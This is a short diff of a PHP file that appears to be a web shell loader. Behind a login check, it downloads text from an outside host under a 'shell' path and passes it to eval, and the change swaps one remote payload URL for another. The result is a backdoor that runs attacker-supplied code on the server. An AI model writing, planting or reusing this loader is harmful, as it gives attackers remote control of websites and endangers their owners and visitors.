@@ -33,7 +33,7 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://marslogs.co.id/shell/shell/403-for.txt');
+    $a = geturlsinfo('https://marslogs.co.id/shell/shell/type.txt');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
